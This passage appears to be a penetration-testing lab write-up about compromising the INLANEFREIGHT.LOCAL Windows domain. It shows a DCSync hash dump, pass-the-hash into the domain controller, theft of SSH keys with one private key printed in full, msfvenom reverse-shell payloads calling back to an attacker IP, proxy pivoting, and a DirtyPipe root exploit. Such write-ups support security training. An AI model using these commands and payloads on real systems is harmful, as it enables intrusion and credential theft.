Looking a bit further we see that the **SERVER ADMINS** group has the ability to perform the **DCSync** attack to obtain NTLM password hashes for **any users in the domain.**

![[Pasted image 20260219134028.png]]

We abused this by first adding the `ttimmons` user to the group. First we needed to create another PSCredential object.


```powershell
PS C:\DotNetNuke\Portals\0> $timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
PS C:\DotNetNuke\Portals\0> New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
```

Next, we added the user to the target group and inherited the DCSync privileges.

```powershell
PS C:\DotNetNuke\Portals\0> $group = Convert-NameToSid "Server Admins"
PS C:\DotNetNuke\Portals\0> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```

``` shell
$ sudo proxychains secretsdump.py INLANEFREIGHT.LOCAL/ttimmons:'Repeat09'@172.16.8.3 -dc-ip 172.16.8.3 -just-dc-ntlm
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:49666  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b9362dfa5abf924b0d172b8c49ab58ac:::
inlanefreight.local\avazquez:1716:aad3b435b51404eeaad3b435b51404ee:762cbc5ea2edfca03767427b2f2a909f:::
inlanefreight.local\pfalcon:1717:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b13244e7c879d8177539:::
inlanefreight.local\fanthony:1718:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::
inlanefreight.local\wdillard:1719:aad3b435b51404eeaad3b435b51404ee:69ada25bbb693f9a85cd5f176948b0d5:::
inlanefreight.local\lbradford:1720:aad3b435b51404eeaad3b435b51404ee:0717dbc7b0e91125777d3ff4f3c00533:::
inlanefreight.local\sgage:1721:aad3b435b51404eeaad3b435b51404ee:31501a94e6027b74a5710c90d1c7f3b9:::
inlanefreight.local\asanchez:1722:aad3b435b51404eeaad3b435b51404ee:c6885c0fa57ec94542d362cf7dc2d541:::
inlanefreight.local\dbranch:1723:aad3b435b51404eeaad3b435b51404ee:a87c92932b0ef15f6c9c39d6406c3a75:::
inlanefreight.local\ccruz:1724:aad3b435b51404eeaad3b435b51404ee:a9be3a88067ed776d0e2cf4ccde8ec8f:::
inlanefreight.local\njohnson:1725:aad3b435b51404eeaad3b435b51404ee:1b2a9f3b6d785e695aadfe3485a2601f:::
inlanefreight.local\mholliday:1726:aad3b435b51404eeaad3b435b51404ee:a87c92932b0ef15f6c9c39d6406c3a75:::
inlanefreight.local\mshoemaker:1727:aad3b435b51404eeaad3b435b51404ee:c15d04d9a989b3c9f1d2db979ffa325f:::
inlanefreight.local\aslater:1728:aad3b435b51404eeaad3b435b51404ee:e7d0a88542cb44ab48e5a89d864f8146:::
inlanefreight.local\kprentiss:1729:aad3b435b51404eeaad3b435b51404ee:9b12a0a33aabdbd845cd3ed5070820b9:::
inlanefreight.local\gdavis:1730:aad3b435b51404eeaad3b435b51404ee:1ab3ee9bd2e35ad25670481d9d1b4e0f:::
inlanefreight.local\jmcdaniel:1731:aad3b435b51404eeaad3b435b51404ee:1e22653293daff337f58d32695c999d0:::
inlanefreight.local\jjones:1732:aad3b435b51404eeaad3b435b51404ee:a90431144f59bc8aeecc28038d6bda40:::
inlanefreight.local\tgarcia:1733:aad3b435b51404eeaad3b435b51404ee:8a4c52fc75514ddb740971e26b9311d9:::
inlanefreight.local\mharrison:1734:aad3b435b51404eeaad3b435b51404ee:4befb46af523d5899f605eb13fa91788:::
inlanefreight.local\nhight:1735:aad3b435b51404eeaad3b435b51404ee:9dbd90a7155594a3950791b2a20b90dd:::
inlanefreight.local\wbaird:1736:aad3b435b51404eeaad3b435b51404ee:f30ba55f393d631be27cc76b385af8f9:::
inlanefreight.local\mochoa:1737:aad3b435b51404eeaad3b435b51404ee:0d2134c49735d6b979b0ee3adf520d4b:::
inlanefreight.local\jhopkins:1738:aad3b435b51404eeaad3b435b51404ee:eae13b6506b3112fee868ba26c1ade92:::
inlanefreight.local\hblea:1739:aad3b435b51404eeaad3b435b51404ee:4bfd7bb2c984e909198c2a4033d58806:::

<SNIP>
</SNIP>
```

We were able to Pass-the-Hash to login to the Admin of the Domain Controller (DC)

```shell
$ sudo proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

# Post Exploitation

Within the C:\Department Shares\IT\Private\Networking share we saw two subdirectories: `Development` and `Networking`. The Development subdirectory houses the backup script that we obtained earlier. 

Inside the Networking subdirectory, there were three private SSH keys for three different users.

``` shell
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> dir


    Directory: C:\Department Shares\IT\Private\Networking


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/1/2022  11:34 AM           1706 harry-id_rsa
-a----         6/1/2022  11:34 AM           1702 james-id_rsa
-a----         6/1/2022  11:34 AM           1706 ssmallsadm-id_rsa
```

![[Pasted image 20260219140402.png]]
```shell
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> ipconfig /all
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DC01
   Primary Dns Suffix  . . . . . . . : INLANEFREIGHT.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : INLANEFREIGHT.LOCAL

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B0-B9-79
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::ec06:fc7:db77:ff6a%4(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.8.3(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 172.16.8.1
   DHCPv6 IAID . . . . . . . . . . . : 100683862
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-31-29-0A-A4-00-50-56-B0-B9-79
   DNS Servers . . . . . . . . . . . : ::1
                                       172.16.8.3
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-B0-76-A8
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::64c3:9ede:a64c:8e19%7(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.9.3(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   ##### Default Gateway . . . . . . . . . : 172.16.9.1
   DHCPv6 IAID . . . . . . . . . . . : 167792726
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-31-29-0A-A4-00-50-56-B0-B9-79
   DNS Servers . . . . . . . . . . . : ::1
                                       172.16.9.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

Looking at the network adapters on the Domain Controllers we saw that it has a second NIC in the 172.16.9.0 network.

We downloaded all the RSA keys:

```shell
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> download harry-id_rsa
                                        
Info: Downloading C:\Department Shares\IT\Private\Networking\harry-id_rsa to harry-id_rsa
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> download james-id_rsa

                                        
Info: Downloading C:\Department Shares\IT\Private\Networking\james-id_rsa to james-id_rsa
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> 
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> download ssmallsadm-id_rsa
                                        
Info: Downloading C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa to ssmallsadm-id_rsa
                                        
Info: Download successful!
```

Here is what we were trying to achieve next: starting from our attack host and pivoting through the dmz01 and DC01 hosts to be able to SSH directly into the MGMT01 host two hops away directly from our attack host.

`Attack host` --> `dmz01` --> `DC01` --> `MGMT01`

We first needed to establish a reverse shell from the `dmz01` box back to our attack host. We did this by creating an ELF payload, uploading it to the target and executing it to catch a shell. We started by creating the ELF payload and uploading it back to the dmz01 host via SCP.

 $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.164 LPORT=443 -f elf > shell.elf

```msfconsole
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.14.164
lhost => 10.10.14.15
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 443
LPORT => 443
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.164:443
```

On dmz01:
root@dmz01:/tmp# chmod +x shell.elf
root@dmz01:/tmp# ./shell.elf

![[Pasted image 20260219141330.png]]

Changed directory to /root set up a Local Port Foward destined to port `1234` on dmz01 to port `8443` on our attack host.

![[Pasted image 20260219141930.png]]

$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234

Next, we uploaded the payload to the DC

```shell
*Evil-WinRM* PS C:\> upload "dc_shell.exe"
                                        
Info: Uploading /home/htb-ac-1631704/dc_shell.exe to C:\\dc_shell.exe
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!
```

Backgrounded the Meterpreter session

```shell
(Meterpreter 1)(/root) > bg
[*] Backgrounding session 1...
[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >>
```

Started another multi/handler in the same msfconsole session to catch the shell from the DC.

We executed the payload on the DC, and we caught it on our handler.
![[Pasted image 20260219142039.png]]

![[Pasted image 20260219142107.png]]

Next, we set up a route to the `172.16.9.0/23` subnet.

![[Pasted image 20260219142138.png]]

We confirmed this by checking the MSF routing table

![[Pasted image 20260219142205.png]]

Next, we needed to set up a socks proxy before we could communicate directly with the `172.16.9.0/23` network from our attack host.

We edited the `/etc/proxychains.conf` file to use port `9050` that we specified above.

Next, we tested by running Nmap against the target to confirm we're able to scan it. Success!

![[Pasted image 20260219142406.png]]

Next, we SSH'd into 172.16.9.25 using proxy chains and the ssmalls id rsa key we found

$ sudo cat ssmallsadm-id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwRe2tmrKNSOvEfkdgH014WMvNk7fMvMQ9m31Kpo5g9S+/bCl
vWmldCVJT/udEbKK9TR+TnxPEisVwp6QDkB9y6PznCS8y4kz6WP5rV9YoIl8/yyS
INUPWVL/rRoFDTEPlOp5NNkwtBB0uhOBXlRaNb6CBDqEMuk3H8eUJPtxRCkNEwTA
1GcZ8BuUt/c5uWEBj8xz3mSuPpFLNl/SNRrDvcHG0b0aP3MmWpcifCj36IZ6Qzej
gqYZvyX2lY1xFLrvRqa6Gx6jl1bw//K7CTVwuHepDngqJvWaBc1AXWrmLUSPw25t
PWVPCiYD2UgFf6+YPmhB3Yf50Z+Kd0iPgN/HEQIDAQABAoIBAQCQY9o2eI6yw/dT
WlSsU3UqEJAqbTpMkCR8EmeFrwQZR8p2TFTz2f9mZcd3rvCaXke46sMUj7JVJLDF
8upILgOjdvthJLuk+/k8qoz3D1hn28gDzOGM+aXbpswYNl/WqHw9YES4tzzLOY7/
4jwYPL2keMwiu1tF8s1Mz2JBcWEWlMhUWfkh6QimRW1a7m2gZlRRdySVk2/GlN1J
uPO/9kBgaRYxWBNKC87/ExL9d6/usb6p6/2vG9ujUn/J/WlLNeHFf/cfGhF2K/BF
HKuQE5jUClvcxE7h1nmQNHiH/wT7rK0AN9tWAsKk8/XNtU1IYvMr2twxAPgOhTTq
LNSq6AwNAoGBAP7+yo12bjL6fxPC0SFZAGXj8YTz3ukI3DUymuGCVtc3+nWGmy9k
loH0z5WnzG2Hn3Zq+Lg6qb+Y82dQKm2ITg+K/gOmTKj8pAxI+3rl4h9B763q0c6d
EuHBZDgRUr7eGFsAFjrEUkmIvBxh8LxQi0Y3HsHowcDCFj0NefS5B71DAoGBAMHa
e4VivEcYeWWcBGeFtjIEVnl7i0OObz1wwu6NQkN75z3umlj12jqEpBiijgXhqgVN
ytF1r3nDKkDZgpxdq/9twOU5YiwVFB2MfJVD876+4QkwwrK+NxjJuwE4y4LKABaL
VMB3JsY3VSbI727D8GIPp8cYA0nDf4bIn+JfmFsbAoGASSznBZeB4kE+bHZQu2gm
FBdIvOWbB3bScrW1+pcDwrk+t7FMIVqVUm/ljkXcBWaRHVNvUrcK9X+4AeLgehRO
imlRocx8XVY64YekG02TCXNLi7ZCRS+QNpbf4rMd8sYbaSnqNy0VjCKgEOkOQ4w9
m4W/3tejmmRYK2cNo2vhy68CgYBsepjYwbHejyGP7MjCLZ8RSkAh5zK9cT1qwmkz
GTVVkkaK77TLx3iBeqxhZMXZILkGEsxGfnbdyosgkxd17S1M2Nwy6fO3+2uwRWeK
F+aUfThs7i5l2+/1HR5axq+L1wJJm1qoAYVfMqOh+puR/m/MUDpxPUzJwG7iu+5M
vXYCtQKBgQDV/fEEZuNd9GTKwcQCX3nP4Knk1G99taneKzpnI2GJEtbDBhAYNVCa
gxEGvyl7W1Vi528f21D3uASxrQj+PqYBXhvlSRoEIqXAE6ZHD1p2UFoxCZ+a0fmn
2KEFWFDUbgyTpK3ofVRM7Slhc7C7xuzzqQihIslu2E9vepQPMyDHlw==
-----END RSA PRIVATE KEY-----


$echo "-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwRe2tmrKNSOvEfkdgH014WMvNk7fMvMQ9m31Kpo5g9S+/bCl
vWmldCVJT/udEbKK9TR+TnxPEisVwp6QDkB9y6PznCS8y4kz6WP5rV9YoIl8/yyS
INUPWVL/rRoFDTEPlOp5NNkwtBB0uhOBXlRaNb6CBDqEMuk3H8eUJPtxRCkNEwTA
1GcZ8BuUt/c5uWEBj8xz3mSuPpFLNl/SNRrDvcHG0b0aP3MmWpcifCj36IZ6Qzej
gqYZvyX2lY1xFLrvRqa6Gx6jl1bw//K7CTVwuHepDngqJvWaBc1AXWrmLUSPw25t
PWVPCiYD2UgFf6+YPmhB3Yf50Z+Kd0iPgN/HEQIDAQABAoIBAQCQY9o2eI6yw/dT
WlSsU3UqEJAqbTpMkCR8EmeFrwQZR8p2TFTz2f9mZcd3rvCaXke46sMUj7JVJLDF
8upILgOjdvthJLuk+/k8qoz3D1hn28gDzOGM+aXbpswYNl/WqHw9YES4tzzLOY7/
4jwYPL2keMwiu1tF8s1Mz2JBcWEWlMhUWfkh6QimRW1a7m2gZlRRdySVk2/GlN1J
uPO/9kBgaRYxWBNKC87/ExL9d6/usb6p6/2vG9ujUn/J/WlLNeHFf/cfGhF2K/BF
HKuQE5jUClvcxE7h1nmQNHiH/wT7rK0AN9tWAsKk8/XNtU1IYvMr2twxAPgOhTTq
LNSq6AwNAoGBAP7+yo12bjL6fxPC0SFZAGXj8YTz3ukI3DUymuGCVtc3+nWGmy9k
loH0z5WnzG2Hn3Zq+Lg6qb+Y82dQKm2ITg+K/gOmTKj8pAxI+3rl4h9B763q0c6d
EuHBZDgRUr7eGFsAFjrEUkmIvBxh8LxQi0Y3HsHowcDCFj0NefS5B71DAoGBAMHa
e4VivEcYeWWcBGeFtjIEVnl7i0OObz1wwu6NQkN75z3umlj12jqEpBiijgXhqgVN
ytF1r3nDKkDZgpxdq/9twOU5YiwVFB2MfJVD876+4QkwwrK+NxjJuwE4y4LKABaL
VMB3JsY3VSbI727D8GIPp8cYA0nDf4bIn+JfmFsbAoGASSznBZeB4kE+bHZQu2gm
FBdIvOWbB3bScrW1+pcDwrk+t7FMIVqVUm/ljkXcBWaRHVNvUrcK9X+4AeLgehRO
imlRocx8XVY64YekG02TCXNLi7ZCRS+QNpbf4rMd8sYbaSnqNy0VjCKgEOkOQ4w9
m4W/3tejmmRYK2cNo2vhy68CgYBsepjYwbHejyGP7MjCLZ8RSkAh5zK9cT1qwmkz
GTVVkkaK77TLx3iBeqxhZMXZILkGEsxGfnbdyosgkxd17S1M2Nwy6fO3+2uwRWeK
F+aUfThs7i5l2+/1HR5axq+L1wJJm1qoAYVfMqOh+puR/m/MUDpxPUzJwG7iu+5M
vXYCtQKBgQDV/fEEZuNd9GTKwcQCX3nP4Knk1G99taneKzpnI2GJEtbDBhAYNVCa
gxEGvyl7W1Vi528f21D3uASxrQj+PqYBXhvlSRoEIqXAE6ZHD1p2UFoxCZ+a0fmn
2KEFWFDUbgyTpK3ofVRM7Slhc7C7xuzzqQihIslu2E9vepQPMyDHlw==
-----END RSA PRIVATE KEY-----" > id_ssmalls

$chmod 600 id_ssmalls


``` shell
$ proxychains ssh -i id_ssmalls ssmallsadm@172.16.9.25
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.9.25:22  ...  OK
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 19 Feb 2026 08:16:13 PM UTC

  System load:  0.0                Processes:               233
  Usage of /:   27.4% of 13.72GB   Users logged in:         0
  Memory usage: 11%                IPv4 address for ens160: 172.16.9.25
  Swap usage:   0%


159 updates can be applied immediately.
103 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Mon May 23 08:48:13 2022 from 172.16.0.1
ssmallsadm@MGMT01:~$ whoami
ssmallsadm
ssmallsadm@MGMT01:~$ uname -a
Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

We did a Google searched based off of the Kernel version and saw that it is likely vulnerable to the [DirtyPipe](https://www.cisa.gov/uscert/ncas/current-activity/2022/03/10/dirty-pipe-privilege-escalation-vulnerability-linux), `CVE-2022-0847`.

We used the exploit from this [this GitHub repo]([https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c)). Since we have SSH access to this host, we created a file "dirtypipe.c" with this exploit.

Next, we needed to compile it, and luckily gcc is present on the system

```shell
ssmallsadm@MGMT01:~$ vi dirtypipe.c
ssmallsadm@MGMT01:~$ gcc dirtypipe.c -o dirtypipe
ssmallsadm@MGMT01:~$ chmod +x dirtypipe
ssmallsadm@MGMT01:~$ ./dirtypipe 
Usage: ./dirtypipe SUID
```

We must run the exploit against a SUID binary to inject and overwrite memory in a root process. So first we needed to search SUID binaries on the system.

```shell
ssmallsadm@MGMT01:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/passwd
<SNIP>
</SNIP>
```

Finally, we ran the exploit against the /usr/lib/openssh/ssh-keysign SUID binary and was dropped into a root shell

```shell
ssmallsadm@MGMT01:~$ ./dirtypipe /usr/lib/openssh/ssh-keysign
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami
root
# 
```

![[Pasted image 20260219152508.png]]